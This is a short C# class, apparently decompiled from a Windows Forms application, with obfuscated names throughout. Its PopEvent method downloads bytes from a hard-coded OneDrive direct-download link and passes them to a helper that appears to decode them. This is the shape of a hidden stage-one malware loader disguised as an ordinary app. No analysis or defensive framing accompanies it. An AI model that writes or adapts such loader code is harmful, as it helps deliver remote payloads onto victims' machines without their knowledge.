namespace WindowsFormsApp43;

internal class ProxyFactoryTask
{
	internal static ProxyFactoryTask ManageSingleton;

	private static byte[] InterruptEvent(string i)
	{
		return MapperWriter.WriteEvent(i);
	}

	internal static byte[] PopEvent()
	{
		return MapperWriter.SortEvent(InterruptEvent("https://onedrive.live.com/download?cid=BD9480D014FE52E5&resid=BD9480D014FE52E5%21290&authkey=AMZ6XjgyLS8jlHE"));
	}

	internal static bool PrepareSingleton()
	{
		return ManageSingleton == null;
	}

	internal static ProxyFactoryTask ComputeSingleton()
	{
		return ManageSingleton;
	}
}
